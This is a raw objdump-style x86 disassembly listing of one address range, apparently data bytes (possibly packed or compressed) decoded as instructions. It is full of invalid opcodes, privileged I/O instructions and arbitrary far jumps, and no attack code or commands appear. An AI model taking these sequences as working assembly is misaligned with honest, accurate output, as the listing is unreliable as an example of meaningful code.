  43ad51:	xchg   edi,eax
  43ad52:	cmp    ecx,DWORD PTR [esi+0x5b]
  43ad55:	out    dx,eax
  43ad56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad57:	lds    edi,FWORD PTR [esi+0x4c]
  43ad5a:	mov    cl,0x13
  43ad5c:	add    BYTE PTR [eax-0x1efff935],dl
  43ad62:	cmp    al,0x95
  43ad64:	pop    esp
  43ad65:	add    BYTE PTR [eax],al
  43ad67:	add    BYTE PTR [eax],al
  43ad69:	add    BYTE PTR [ecx+edi*2+0x351b51bf],dh
  43ad70:	retf   0x1513
  43ad73:	aam    0x6a
  43ad75:	add    BYTE PTR [eax-0x2bf6ecd7],dl
  43ad7b:	mov    eax,ds:0x65d486d9
  43ad80:	inc    BYTE PTR [edx+0x66141d46]
  43ad86:	mov    BYTE PTR [ebx],dh
  43ad88:	push   cs
  43ad89:	push   edx
  43ad8a:	das    
  43ad8b:	jle    0x43ad3b
  43ad8d:	adc    eax,edx
  43ad8f:	mov    DWORD PTR [ebp+0xe218cc4],ecx
  43ad95:	adc    BYTE PTR [eax+0x65eadd89],dl
  43ad9b:	mov    bh,bl
  43ad9d:	daa    
  43ad9e:	adc    eax,ebp
  43ada0:	adc    bh,cl
  43ada2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ada3:	adc    ebp,edi
  43ada5:	aas    
  43ada6:	nop
  43ada7:	adc    al,0x26
  43ada9:	sub    edi,0x57
  43adac:	push   0xffffff91
  43adae:	nop
  43adaf:	mov    DWORD PTR [esi],ecx
  43adb1:	jge    0x43ae0f
  43adb3:	lods   eax,DWORD PTR ds:[esi]
  43adb4:	bnd jmp DWORD PTR [ebx+0x5c]
  43adb8:	mov    eax,0xeebcceff
  43adbd:	and    eax,edi
  43adbf:	mov    cl,0xea
  43adc1:	jge    0xb63ca5b9
  43adc7:	mov    cl,0xf7
  43adc9:	add    esp,DWORD PTR [ebx]
  43adcb:	or     ecx,DWORD PTR [ebx-0x41]
  43adce:	add    BYTE PTR [eax],al
  43add0:	add    BYTE PTR [eax],al
  43add2:	add    BYTE PTR [ebx-0x6a],dh
  43add5:	pop    es
  43add6:	mov    edx,DWORD PTR [esi+ecx*8-0x3d]
  43adda:	jl     0x43ad6c
  43addc:	mov    ds:0xdddf03f7,al
  43ade1:	js     0x43ad96
  43ade3:	(bad)  
  43ade4:	sub    esp,DWORD PTR [edi+ebx*8+0x7be375ab]
  43adeb:	mov    ds:0x5080f7f2,eax
  43adf0:	jmp    FWORD PTR [ebp-0xc313376]
  43adf6:	adc    BYTE PTR [eax-0x1],0xe0
  43adfa:	add    ch,BYTE PTR [eax-0x46]
  43adfd:	dec    esp
  43adfe:	scas   al,BYTE PTR es:[edi]
  43adff:	mov    ebp,DWORD PTR [edi]
  43ae01:	and    ch,BYTE PTR [edi-0x55d60c]
  43ae07:	cmp    al,0x66
  43ae09:	pop    ebp
  43ae0a:	inc    ebp
  43ae0b:	sub    BYTE PTR [eax-0x17],bh
  43ae0e:	sub    DWORD PTR ss:[edi],ebp
  43ae11:	cmp    BYTE PTR [edi-0x20938a91],ch
  43ae17:	jnp    0x43ae42
  43ae19:	repnz add dl,dl
  43ae1c:	scas   al,BYTE PTR es:[edi]
  43ae1d:	mov    bl,dl
  43ae1f:	or     BYTE PTR [eax-0x4daff265],ah
  43ae25:	pop    esp
  43ae26:	shl    BYTE PTR [ebx-0x7bbf8b36],0xb3
  43ae2d:	cmp    DWORD PTR [eax],eax
  43ae2f:	cmc    
  43ae30:	sub    al,0x6d
  43ae32:	inc    ebp
  43ae33:	clc    
  43ae34:	and    dh,al
  43ae36:	xor    al,0x0
  43ae38:	add    BYTE PTR [eax],al
  43ae3a:	add    BYTE PTR [eax],al
  43ae3c:	fld    DWORD PTR [edx-0x9]
  43ae3f:	sub    BYTE PTR [ecx+ebp*1+0xf],bh
  43ae43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ae44:	jl     0x43ae77
  43ae46:	pop    es
  43ae47:	scas   al,BYTE PTR es:[edi]
  43ae48:	jge    0x43ae7b
  43ae4a:	loope  0x43ae69
  43ae4c:	mov    ebp,0xfa91192e
  43ae51:	popf   
  43ae52:	jmp    0x4a7950ed
  43ae57:	das    
  43ae58:	mov    edi,0x88ab47de
  43ae5d:	mov    dl,0x8d
  43ae5f:	lea    ecx,[eax-0x1745bf19]
  43ae65:	out    0x76,eax
  43ae67:	imul   ecx,DWORD PTR [edx+esi*4-0x186e2cf2],0x752be874
  43ae72:	jmp    0x5c05:0x637a53e9
  43ae79:	sub    al,0x5b
  43ae7b:	or     eax,0xa5047a6c
  43ae80:	xor    edx,0xf784620e
  43ae86:	call   0xb2723bb9
  43ae8b:	jmp    0x91856123
  43ae90:	xchg   ebx,eax
  43ae91:	mov    ds:0x7a40e90e,al
  43ae96:	and    al,0xc1
  43ae98:	adc    dh,ch
  43ae9a:	push   cs
  43ae9b:	push   es
  43ae9c:	(bad)  
  43ae9d:	cli    
  43ae9e:	cld    
  43ae9f:	test   al,0x0
  43aea1:	add    BYTE PTR [eax],al
  43aea3:	add    BYTE PTR [eax],al
  43aea5:	xchg   ebx,eax
  43aea6:	das    
  43aea7:	out    0x6c,eax
  43aea9:	(bad)  
  43aeac:	xchg   esp,eax
  43aead:	sbb    BYTE PTR [edi-0x330fbad8],cl
  43aeb3:	(bad)  
  43aeb4:	sti    
  43aeb5:	loopne 0x43af30
  43aeb7:	arpl   WORD PTR ds:0xf50479f8,cx
  43aebd:	xor    dl,0xe
  43aec0:	add    BYTE PTR [eax+esi*4+0x43e9ffe9],dl
  43aec7:	inc    eax
  43aec8:	lea    edi,[ebp-0x6e]
  43aecb:	sbb    dl,BYTE PTR [eax+0x32]
  43aece:	xor    eax,0xaea1182e
  43aed3:	(bad)  
  43aed4:	jmp    FWORD PTR [ecx-0x4e8f189b]
  43aeda:	mov    ebp,0x709cb7fd
  43aedf:	jmp    0x6d8b:0x2444e984
  43aee6:	xchg   edx,eax
  43aee7:	sbb    al,BYTE PTR [ebp+0x3314439]
  43aeed:	adc    DWORD PTR [ecx],esi
  43aeef:	out    0x0,al
  43aef1:	imul   edx,DWORD PTR [eax],0x61a1770f
  43aef7:	xchg   ebp,eax
  43aef8:	dec    esp
  43aef9:	popf   
  43aefa:	call   0x15e7:0x661e5059
  43af01:	xchg   ecx,eax
  43af02:	mov    al,ds:0xefec004e
  43af07:	bound  edx,QWORD PTR ds:0x0
  43af0d:	add    BYTE PTR [edx+0x42102e33],dh
  43af13:	xor    al,0x2e
  43af15:	sbb    BYTE PTR ds:0xff09f41d,bl
  43af1b:	mov    esi,0x70287ffd
  43af20:	jmp    0xc6e8:0xd82b38b2
  43af27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43af28:	out    0xff,eax
  43af2a:	hlt    
  43af2b:	gs out 0x15,eax
  43af2e:	sbb    DWORD PTR [edx-0xbe9ffb2],esp
  43af34:	ret    
  43af35:	jne    0x43af37
  43af37:	cmc    
  43af38:	pop    edx
  43af39:	and    al,0x91
  43af3b:	xchg   esi,eax
  43af3c:	sbb    dl,BYTE PTR [ecx+0x5a1e5c90]
  43af42:	sbb    cl,BYTE PTR [ecx-0x26]
  43af45:	jl     0x43af1b
  43af47:	jge    0x43af9d
  43af49:	or     al,0x90
  43af4b:	sahf   
  43af4c:	imul   ebp,esp,0x8b1b6e13
  43af52:	pop    ebp
  43af53:	xor    eax,0x6751c2
  43af58:	cmp    al,0x85
  43af5a:	inc    ebp
  43af5b:	test   DWORD PTR [esi],eax
  43af5d:	push   es
  43af5e:	addr16 sbb al,0x1e
  43af61:	test   al,dl
  43af63:	popf   
  43af64:	les    edi,FWORD PTR [edi+0x1d]
  43af67:	das    
  43af68:	adc    DWORD PTR [ebp+0x2a7611d],eax
  43af6e:	adc    ecx,DWORD PTR [ebx+0x17]
  43af71:	in     eax,0x0
  43af73:	add    BYTE PTR [eax],al
  43af75:	add    BYTE PTR [eax],al
  43af77:	xchg   ebx,eax
  43af78:	or     BYTE PTR ds:0xf2567ff5,dh
  43af7e:	test   BYTE PTR [edi-0x2c],al
  43af81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43af82:	imul   DWORD PTR [edi+0x56]
  43af85:	or     bh,cl
  43af87:	fst    QWORD PTR [ecx-0x13a48afa]
  43af8d:	sbb    eax,0x530d3b2d
  43af92:	je     0x43af3e
  43af94:	adc    ebx,DWORD PTR ds:0x4e107073
  43af9a:	stc    
  43af9b:	lds    ebp,FWORD PTR [ebp-0x6b1cb33f]
  43afa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afa2:	out    dx,eax
  43afa3:	cmp    BYTE PTR [esi+0x3a],dl
  43afa6:	stc    
  43afa7:	daa    
  43afa8:	or     eax,0xb8927453
  43afad:	adc    eax,DWORD PTR [ebp+0x270aa5c5]
  43afb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afb4:	jl     0x43afd3
  43afb6:	test   DWORD PTR [ebp+0x79],edx
  43afb9:	push   es
  43afba:	pop    ds
  43afbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afbc:	mov    dl,0xf0
  43afbe:	xor    cl,BYTE PTR [esi]
  43afc0:	outs   dx,DWORD PTR ds:[esi]
  43afc1:	sub    edx,edx
  43afc3:	inc    esp
  43afc4:	imul   esi,DWORD PTR [esi+0x20e1e7e7],0x384b779c
  43afce:	add    al,0xd9
  43afd0:	pushf  
  43afd1:	aas    
  43afd2:	adc    eax,0x2b6cb250
  43afd7:	adc    esi,DWORD PTR [ebx+0x24]
  43afda:	pushf  
  43afdb:	add    BYTE PTR [eax],al
  43afdd:	add    BYTE PTR [eax],al
  43afdf:	add    BYTE PTR [edx-0x24],ah
  43afe2:	push   DWORD PTR [edi-0x25080e10]
  43afe8:	jl     0x43b066
  43afea:	sbb    DWORD PTR [eax],0x4379ff0
  43aff0:	adc    eax,0x1c207b8a
  43aff5:	jmp    0x43aff6
  43aff7:	pop    es
  43aff8:	mov    al,ds:0x8f9df7b2
  43affd:	jno    0x43afa2
  43afff:	(bad)  
  43b001:	div    bh
  43b003:	xor    ah,BYTE PTR [ebx+0x6fc3e5ea]
  43b009:	cmp    eax,0xe7628848
  43b00e:	jmp    0x1c3abae9
  43b013:	adc    al,0xc0
  43b015:	or     BYTE PTR [ebp-0x84d66ce],cl
  43b01b:	popf   
  43b01c:	inc    edi
  43b01d:	cmp    ebx,DWORD PTR [edi+eiz*8-0x77d48e65]
  43b024:	push   eax
  43b025:	call   0x970f9d23
  43b02a:	out    0x2,eax
  43b02c:	pushw  cs
  43b02e:	aam    0x13
  43b030:	or     BYTE PTR [edi+0x3d911ef1],dh
  43b036:	cmp    bl,BYTE PTR [ebx]
  43b038:	aaa    
  43b039:	leave  
  43b03a:	push   cs
  43b03b:	test   cl,0x7
  43b03e:	inc    edx
  43b03f:	out    dx,al
  43b040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b041:	cs std 
  43b043:	sub    BYTE PTR [eax],al
  43b045:	add    BYTE PTR [eax],al
  43b047:	add    BYTE PTR [eax],al
  43b049:	mov    WORD PTR [edi],?
  43b04b:	sar    DWORD PTR [edi],1
  43b04d:	fisttp WORD PTR [edx]
  43b04f:	dec    eax
  43b050:	stos   BYTE PTR es:[edi],al
  43b051:	mov    edi,0xc338fb36
  43b056:	out    dx,al
  43b057:	jae    0x43b01a
  43b059:	mov    WORD PTR [edx+eax*2],es
  43b05c:	jb     0x43b059
  43b05e:	mov    ecx,0xf546e974
  43b063:	out    0x19,al
  43b065:	aas    
  43b066:	cmc    
  43b067:	jmp    0x4207c6a5
  43b06c:	sahf   
  43b06d:	xchg   DWORD PTR [edx+0x4],esi
  43b070:	sub    DWORD PTR [ebp+esi*1+0x6aca14cf],ecx
  43b077:	add    al,0x59
  43b079:	jle    0x43b06d
  43b07b:	push   cs
  43b07c:	push   0xffffffbc
  43b07e:	call   0xfe4862e6
  43b083:	out    0x28,al
  43b085:	cmp    BYTE PTR [esi+esi*8-0x159465e4],ah
  43b08c:	jb     0x43b032
  43b08e:	xor    eax,0xd745dde1
  43b093:	push   cs
  43b094:	pop    esp
  43b095:	push   edi
  43b096:	imul   edi,DWORD PTR [edi],0x41c2f59f
  43b09c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b09e:	jb     0x43b0a4
  43b0a0:	test   eax,0xe8e6ef93
  43b0a5:	push   es
  43b0a6:	mov    ebx,0x3437b495
  43b0ab:	fcom   DWORD PTR [ebp+0x0]
  43b0b1:	add    BYTE PTR [ebx-0x54eeabc9],al
  43b0b7:	jno    0x43b0ae
  43b0b9:	loopne 0x43b057
  43b0bb:	jl     0x43b0b4
  43b0bd:	add    BYTE PTR [esi],bh
  43b0bf:	retf   
  43b0c0:	out    0xff,eax
  43b0c2:	dec    edx
  43b0c3:	stos   DWORD PTR es:[edi],eax
  43b0c4:	inc    edi
  43b0c5:	mov    esi,DWORD PTR [edi-0x223d2e7c]
  43b0cb:	mov    ah,0x59
  43b0cd:	add    DWORD PTR [ebp-0x5bad15a6],0xffffff8c
  43b0d4:	aas    
  43b0d5:	mov    esp,DWORD PTR [ebx]
  43b0d7:	xchg   BYTE PTR [ebx+0x7ac7cee9],dl
  43b0dd:	adc    ch,BYTE PTR [ecx+0xef893b6]
  43b0e3:	sub    DWORD PTR [esi],ebp
  43b0e5:	sbb    al,0x2c
  43b0e7:	jns    0x43b117
  43b0e9:	adc    al,0x99
  43b0eb:	xchg   DWORD PTR [edx-0x1],esi
  43b0ee:	out    dx,al
  43b0ef:	mov    ah,0xe
  43b0f1:	push   ebp
  43b0f2:	push   cs
  43b0f3:	enter  0x15ce,0x79
  43b0f7:	mov    dh,0x8d
  43b0f9:	rol    BYTE PTR [eax+ebx*1-0x38c6ea19],0x4e
  43b101:	add    dl,bh
  43b103:	fwait
  43b104:	pusha  
  43b105:	jne    0x43b0ad
  43b107:	in     eax,dx
  43b108:	pop    edx
  43b109:	and    al,0x59
  43b10b:	pop    edi
  43b10c:	loope  0x43b11d
  43b10e:	repz sub DWORD PTR es:[edx+eiz*1-0x34],esi
  43b114:	mov    bh,0x15
  43b116:	add    BYTE PTR [eax],al
  43b118:	add    BYTE PTR [eax],al
  43b11a:	add    BYTE PTR [esi-0xb0f6c5e],bh
  43b120:	test   eax,0x72dc4062
  43b125:	jmp    0xe7cddb7a
  43b12a:	adc    eax,0x4ec5c1
  43b12f:	fdiv   QWORD PTR [edi+0x2e]
  43b132:	adc    BYTE PTR [esi+0x27],ch
  43b135:	cs sbb al,0xe9
  43b138:	mov    DWORD PTR [edx-0x1],esi
  43b13b:	nop
  43b13c:	enter  0xd,0xc5
  43b140:	rol    BYTE PTR [eax],0xc0
  43b143:	jge    0x43b15e
  43b145:	push   cs
  43b146:	jge    0x43b150
  43b148:	pop    ebx
  43b149:	mov    eax,ds:0xf2161b0d
  43b14e:	pop    ss
  43b14f:	adc    eax,0xb01a193
  43b154:	sahf   
  43b155:	test   BYTE PTR [edi],0x19
  43b158:	pop    ebx
  43b159:	gs ret 0x52fb
  43b15d:	gs retf 0xece8
  43b161:	pop    es
  43b162:	stc    
  43b163:	xlat   BYTE PTR ds:[ebx]
  43b164:	ins    BYTE PTR es:[edi],dx
  43b165:	dec    esi
  43b166:	pop    ecx
  43b167:	outs   dx,BYTE PTR ds:[esi]
  43b168:	into   
  43b169:	aad    0x56
  43b16b:	rcl    BYTE PTR [ecx+0xe],cl
  43b16e:	push   ebx
  43b16f:	or     ebp,DWORD PTR [esi]
  43b171:	les    ecx,FWORD PTR [esi+ebx*2-0x50]
  43b175:	ret    
  43b176:	sub    al,0xcb
  43b178:	lods   al,BYTE PTR ds:[esi]
  43b179:	mov    dh,BYTE PTR [ebp-0x74]
  43b17c:	pop    ecx
  43b17d:	push   cs
  43b17e:	test   DWORD PTR [eax],eax
  43b180:	add    BYTE PTR [eax],al
  43b182:	add    BYTE PTR [eax],al
  43b184:	call   0x1299:0x81fc0840
  43b18b:	test   DWORD PTR [eax-0x1a8bdf2a],eax
  43b191:	int3   
  43b192:	ror    DWORD PTR gs:[ebx],1
  43b195:	dec    edi
  43b196:	or     ebx,DWORD PTR [esi+0x0]
  43b199:	fnstcw WORD PTR [ecx]
  43b19b:	xchg   ebp,edx
  43b19d:	or     eax,0x1edcc098
  43b1a2:	lds    eax,FWORD PTR [edx]
  43b1a4:	fsubr  QWORD PTR ds:0x4cc2ffd2
  43b1aa:	mov    ebp,0xcd022b02
  43b1af:	call   edi
  43b1b1:	dec    esp
  43b1b2:	mov    ebp,0xfe863f51
  43b1b7:	or     eax,0x7af7b2d0
  43b1bc:	sub    BYTE PTR ds:0xda80b809,dh
  43b1c2:	out    0xe6,eax
  43b1c4:	pop    ds
  43b1c5:	outs   dx,DWORD PTR ds:[esi]
  43b1c6:	mov    eax,ds:0xc4c6832e
  43b1cb:	ret    
  43b1cc:	invd   
  43b1ce:	jmp    0xb80821eb
  43b1d3:	add    ebp,DWORD PTR ds:0x68140cb1
  43b1d9:	mov    dl,0x77
  43b1db:	add    edx,DWORD PTR [eax-0x144736fd]
  43b1e1:	pop    es
  43b1e2:	rcr    DWORD PTR [eax],0xb8
  43b1e5:	ret    
  43b1e6:	aaa    
  43b1e7:	add    al,0x0
  43b1e9:	add    BYTE PTR [eax],al
  43b1eb:	add    BYTE PTR [eax],al
  43b1ed:	inc    edx
  43b1ee:	outs   dx,DWORD PTR ds:[esi]
  43b1ef:	retf   
  43b1f0:	mov    ds:0xcef7f29d,eax
  43b1f5:	imul   edi,DWORD PTR [esi*4-0xb8c2936],0x245e3703
  43b200:	add    dl,BYTE PTR [eax-0x180ddb4e]
  43b206:	add    al,0x2a
  43b208:	repz mov eax,ds:0xed69ca2
  43b20e:	out    0xdb,al
  43b210:	out    0x16,eax
  43b212:	not    ebx
  43b214:	jecxz  0x43b224
  43b216:	paddusb mm1,QWORD PTR [ebx]
  43b219:	div    BYTE PTR [edx-0x3786fdf3]
  43b21f:	fist   WORD PTR [ecx]
  43b221:	shl    BYTE PTR [edx+0x6db51b5c],1
  43b227:	outs   dx,DWORD PTR ds:[esi]
  43b228:	scas   eax,DWORD PTR es:[edi]
  43b229:	mov    bl,0xce
  43b22b:	je     0x43b25d
  43b22d:	pop    ecx
  43b22e:	mov    esi,0x6e4ecb7b
  43b233:	clc    
  43b234:	or     ah,0x96
  43b237:	push   cs
  43b238:	add    eax,0xa5d20164
  43b23d:	das    
  43b23e:	mov    ds:0xb293eb3a,al
  43b243:	jmp    0x4f00323c
  43b248:	jmp    0x655e2555
  43b24d:	xor    BYTE PTR [ebp-0x16],ch
  43b250:	jmp    0x43b255
  43b255:	add    BYTE PTR [edx+0x18b532fe],cl
  43b25b:	jbe    0x43b277
  43b25d:	ins    DWORD PTR es:[edi],dx
  43b25e:	cld    
  43b25f:	ins    BYTE PTR es:[edi],dx
  43b260:	jmp    0xd859:0xceb8eae9
  43b267:	ins    DWORD PTR es:[edi],dx
  43b268:	sbb    DWORD PTR [ebp-0x49],esp
  43b26b:	mov    dl,0xe
  43b26d:	jmp    0xb2d7e052
  43b272:	sbb    BYTE PTR [edi+eiz*1-0x6d43ea0b],bh
  43b279:	iret   
  43b27a:	mov    WORD PTR [edx+0x2ea9290e],?
  43b280:	pop    ebp
  43b281:	mov    ebx,0xa6793994
  43b286:	jge    0x43b2bd
  43b288:	push   ebx
  43b289:	lds    edi,FWORD PTR [edi+0x31]
  43b28c:	iret   
  43b28d:	out    0x17,al
  43b28f:	mov    ecx,DWORD PTR [edi]
  43b291:	jmp    0xcda71e29
  43b296:	xchg   edi,edx
  43b298:	push   cs
  43b299:	adc    DWORD PTR [esi+esi*4-0x3e5316f2],ecx
  43b2a0:	jmp    0x1761:0x956d53d8
  43b2a7:	imul   ebx,DWORD PTR [edx],0x65
  43b2aa:	loop   0x43b25e
  43b2ac:	push   cs
  43b2ad:	jmp    0x176b990
  43b2b2:	fnstcw WORD PTR [ebx-0x9]
  43b2b5:	add    BYTE PTR [ecx],al
  43b2b7:	xlat   BYTE PTR ds:[ebx]
  43b2b8:	out    0xff,eax
  43b2ba:	add    BYTE PTR [eax],al
  43b2bc:	add    BYTE PTR [eax],al
  43b2be:	add    dl,al
  43b2c0:	(bad)  
  43b2c1:	aas    
  43b2c2:	call   FWORD PTR [ecx+edx*1+0x1c]
  43b2c6:	inc    eax
  43b2c7:	sub    DWORD PTR [esp+eax*8],esi
  43b2ca:	bsr    eax,DWORD PTR [eax+0xf]
  43b2ce:	add    BYTE PTR [ecx],bh
  43b2d0:	jmp    0x7815:0x5a51245a
  43b2d7:	xchg   ebp,eax
  43b2d8:	jne    0x43b2c4
  43b2da:	je     0x43b268
  43b2dc:	sahf   
  43b2dd:	cmp    edi,edi
  43b2df:	fsubr  QWORD PTR [eax]
  43b2e1:	sbb    al,BYTE PTR [eax-0x17]
  43b2e4:	pop    ecx
  43b2e5:	or     eax,0xea757570
  43b2ea:	je     0x43b348
  43b2ec:	jmp    0x43b2eb
  43b2ee:	imul   edx,DWORD PTR [ebp+0x7a],0xffffffea
  43b2f2:	mov    dh,dl
  43b2f4:	jmp    0xf2150311
  43b2f9:	add    bh,bh
  43b2fb:	(bad)  
  43b2fc:	xor    ecx,edi
  43b2fe:	jne    0x43b2a8
  43b300:	jmp    0x43b36c
  43b302:	and    al,0xe1
  43b304:	jmp    0x43b360
  43b306:	and    al,0x8d
  43b308:	in     eax,dx
  43b309:	add    bh,BYTE PTR [ebp+0xeb0bd]
  43b30f:	add    DWORD PTR [esi+0x1b],ebx
  43b312:	inc    DWORD PTR [esi]
  43b314:	jmp    0x74cf:0x34cd2462
  43b31b:	dec    esp
  43b31c:	jmp    0x43b370
  43b31e:	and    al,0x3d
  43b320:	jmp    0x447137
  43b325:	add    BYTE PTR [eax],al
  43b327:	add    BYTE PTR [esi+0x4524529d],ch
  43b32d:	jmp    0xe9d4d79c
  43b332:	push   0x24
  43b334:	pop    ebp
  43b335:	adc    DWORD PTR [ebx-0x5426fb4],0xa4f23f84
  43b33f:	stc    
  43b340:	dec    edi
  43b341:	cmc    
  43b342:	dec    sp
  43b344:	ins    BYTE PTR es:[edi],dx
  43b345:	mov    ecx,0xeb8fcddf
  43b34a:	and    al,0x3e
  43b34c:	or     al,0x9a
  43b34e:	jmp    0x7023:0xa9e35a42
  43b355:	rcl    BYTE PTR [ecx],0x85
  43b358:	pushf  
  43b359:	jge    0x43b35d
  43b35b:	test   DWORD PTR [ebx-0x4e],ecx
  43b35e:	pop    edi
  43b35f:	or     eax,0x5c66b50f
  43b364:	lods   al,BYTE PTR ds:[esi]
  43b365:	push   ecx
  43b366:	pop    es
  43b367:	or     BYTE PTR [ebx],cl
  43b369:	inc    esi
  43b36a:	repnz pop ss
  43b36c:	or     ebx,esi
  43b36e:	icebp  
  43b36f:	adc    eax,DWORD PTR [edi+0x54]
  43b372:	add    BYTE PTR [eax-0x7e],ah
  43b375:	cdq    
  43b376:	adc    cl,BYTE PTR [ebx+0x4fc6bd54]
  43b37c:	cmp    eax,0xa218007c
  43b381:	cdq    
  43b382:	adc    al,BYTE PTR [ebx-0x2e70a330]
  43b388:	mov    esi,0x853624
  43b38d:	add    BYTE PTR [eax],al
  43b38f:	add    BYTE PTR [eax],al
  43b391:	xor    al,0xb5
  43b393:	push   ss
  43b394:	push   ebx
  43b395:	scas   eax,DWORD PTR es:[edi]
  43b396:	outs   dx,BYTE PTR ds:[esi]
  43b397:	scas   al,BYTE PTR es:[edi]
  43b398:	or     eax,0xf98f5950
  43b39d:	(bad)  
  43b39e:	fisub  WORD PTR [edi-0x6]
  43b3a1:	xchg   edi,eax
  43b3a2:	cmp    al,0x6a
  43b3a4:	retf   0xc478
  43b3a7:	add    ecx,edi
  43b3a9:	xchg   eax,esp
  43b3ab:	into   
  43b3ac:	and    esi,DWORD PTR [eax-0x24a52b3c]
  43b3b2:	fimul  DWORD PTR [esi+0x4c]
  43b3b5:	xchg   edx,eax
  43b3b6:	mov    dl,0xf7
  43b3b8:	add    esp,DWORD PTR ds:0x14d2a1ff
  43b3be:	imul   ecx,esi,0xe3e3592a
  43b3c4:	jle    0x43b404
  43b3c6:	imul   ecx,ebx,0xf
  43b3c9:	xchg   ebp,eax
  43b3ca:	repnz idiv DWORD PTR [esi-0x2f]
  43b3ce:	ret    0x8c6c
  43b3d1:	mov    BYTE PTR [ecx+0x221703f7],dh
  43b3d7:	in     al,0x4
  43b3d9:	nop
  43b3da:	mov    dl,0x5c
  43b3dc:	ret    
  43b3dd:	(bad)  
  43b3de:	aaa    
  43b3df:	mov    edi,ds
  43b3e1:	xchg   DWORD PTR [ecx],edi
  43b3e3:	dec    eax
  43b3e4:	cld    
  43b3e5:	push   cs
  43b3e6:	imul   edi,eax,0x7e
  43b3e9:	pop    ecx
  43b3ea:	ret    0x7e91
  43b3ed:	push   esp
  43b3ee:	xchg   esi,eax
  43b3ef:	retf   
  43b3f0:	mov    eax,ds:0x4c8310e
  43b3f5:	add    BYTE PTR [eax],al
  43b3f7:	add    BYTE PTR [eax],al
  43b3f9:	add    BYTE PTR [eax-0x7c4d0f4e],dl
  43b3ff:	imul   esp,ebx,0xfffffff7
  43b402:	mov    ?,edx
  43b404:	not    esi
  43b406:	fadd   st,st(4)
  43b408:	addr16 (bad) 
  43b40b:	mov    dl,0x7a
  43b40d:	inc    ebx
  43b40e:	cmp    al,0xcc
  43b410:	ja     0x43b3b9
  43b412:	jae    0x43b3de
  43b414:	not    ecx
  43b416:	sub    eax,0xae114fb2
  43b41b:	push   0xfffffff8
  43b41d:	(bad)  
  43b41e:	and    edi,DWORD PTR [edx-0x39b3ef78]
  43b424:	aaa    
  43b425:	add    al,0xad
  43b427:	mov    bl,0x98
  43b429:	adc    BYTE PTR [edi+edi*4+0x8e90437],dl
  43b430:	pop    ebp
  43b431:	inc    esi
  43b432:	in     eax,0x74
  43b434:	pmulhw mm2,QWORD PTR [ebx+0x46d9fae7]
  43b43b:	add    eax,0x81e6be41
  43b440:	jne    0x43b4a0
  43b442:	stos   BYTE PTR es:[edi],al
  43b443:	xlat   BYTE PTR ds:[ebx]
  43b444:	add    ah,BYTE PTR [edx-0x63]
  43b447:	imul   eax,DWORD PTR [esi*8+0x720ef2a6],0x4e
  43b44f:	mov    edx,0x2f8fbae9
  43b454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b455:	loope  0x43b3e3
  43b457:	mov    dl,0xe
  43b459:	fisub  WORD PTR [edx+0xe7ff1a]
  43b45f:	add    BYTE PTR [eax],al
  43b461:	add    BYTE PTR [eax],al
  43b463:	xchg   ebx,eax
  43b464:	mov    dl,0xe9
  43b466:	hlt    
  43b467:	daa    
  43b468:	mov    ecx,0xee98e94e
  43b46d:	xor    bh,cl
  43b46f:	jecxz  0x43b473
  43b471:	jmp    0x10e9:0x4ec62fdc
  43b478:	jae    0x43b494
  43b47a:	ins    DWORD PTR es:[edi],dx
  43b47b:	call   0x4768:0xde90eb2
  43b482:	dec    edi
  43b483:	cmc    
  43b484:	push   eax
  43b485:	fs add al,0x5d
  43b488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b489:	(bad)  
  43b48a:	popa   
  43b48b:	sbb    BYTE PTR [esi-0x4dbbfdce],dl
  43b491:	psubsw mm2,QWORD PTR [ebx-0x6d1a6971]
  43b498:	mov    dl,0xe
  43b49a:	call   0xe8424a86
  43b49f:	out    0x95,eax
  43b4a1:	add    ch,al
  43b4a3:	not    DWORD PTR [ebp-0x6a1817fa]
  43b4a9:	or     al,BYTE PTR [edx+0x6ad42ef0]
  43b4af:	mov    esp,0x6c0069bd
  43b4b4:	sbb    ebp,edi
  43b4b6:	sub    ch,BYTE PTR [eax]
  43b4b8:	and    bl,BYTE PTR [ecx]
  43b4ba:	sub    ebp,DWORD PTR [eax]
  43b4bc:	and    cl,BYTE PTR [ecx]
  43b4be:	adc    DWORD PTR [ecx],0xffffffb4
  43b4c1:	bound  esi,QWORD PTR [edx]
  43b4c3:	and    DWORD PTR [ecx],ebx
  43b4c5:	or     DWORD PTR [eax+0x0],ecx
  43b4c8:	add    BYTE PTR [eax],al
  43b4ca:	add    BYTE PTR [eax],al
  43b4cc:	inc    esp
  43b4cd:	sub    eax,0x22f03ef3
  43b4d2:	cs adc dl,dl
  43b4d5:	push   esi
  43b4d6:	imul   ebp,eax,0x3f
  43b4d9:	sbb    DWORD PTR [edi],esi
  43b4db:	dec    eax
  43b4dc:	add    eax,0x5874524f
  43b4e1:	sub    eax,0x72b2325d
  43b4e6:	cs and al,0xa0
  43b4e9:	jb     0x43b519
  43b4eb:	sbb    al,0xa0
  43b4ed:	and    ch,BYTE PTR [esi]
  43b4ef:	sbb    BYTE PTR [edx-0x2abb6cae],dl
  43b4f5:	mov    BYTE PTR [ecx-0x6e4f2abc],dl
  43b4fb:	je     0x43b4d2
  43b4fd:	(bad)  
  43b4fe:	repz push ss
  43b500:	jb     0x43b574
  43b502:	cs and al,0x70
  43b505:	jb     0x43b535
  43b507:	sbb    al,0xc2
  43b509:	pusha  
  43b50a:	xchg   ecx,eax
  43b50b:	je     0x43b4a2
  43b50d:	mov    dh,0x93
  43b50f:	inc    esp
  43b510:	test   DWORD PTR [edx-0x6f],edx
  43b513:	inc    esp
  43b514:	xchg   ebp,eax
  43b515:	ret    0x4495
  43b518:	xchg   ebp,eax
  43b519:	mov    esi,0x14e4ff3e
  43b51e:	(bad)  
  43b51f:	aas    
  43b520:	test   eax,0x8e75cee7
  43b525:	dec    eax
  43b526:	cli    
  43b527:	push   edi
  43b528:	out    dx,al
